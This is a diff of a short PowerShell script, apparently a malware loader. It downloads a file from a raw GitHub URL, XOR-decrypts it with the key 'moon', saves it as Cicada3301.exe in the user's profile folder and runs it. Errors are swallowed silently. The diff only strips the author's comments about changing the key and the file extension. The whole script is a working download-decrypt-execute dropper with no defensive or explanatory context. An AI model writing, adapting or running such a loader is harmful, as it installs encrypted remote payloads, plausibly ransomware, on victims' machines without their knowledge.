@@ -1,7 +1,7 @@
 $u='https://raw.githubusercontent.com/CharonXCII/short/refs/heads/main/SSD'
 
 try {
-    $k = 'moon' //change encryption key 
+    $k = 'moon'
     if (!$u) { throw 'Missing URL' }
 
     Add-Type 'using System.Net;public class D{public static string G(string u){using(var w=new WebClient())return w.DownloadString(u);}}'
@@ -11,10 +11,9 @@ try {
     $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
         $b[$_] -bxor $x[$_ % $x.Length]
     })
-    $file = "$env:USERPROFILE\Cicada3301.exe" //or whatever extension it ischange it here 
+    $file = "$env:USERPROFILE\Cicada3301.exe"
     [IO.File]::WriteAllBytes($file, $o)
     & $file
 }
 catch {
-   
 }
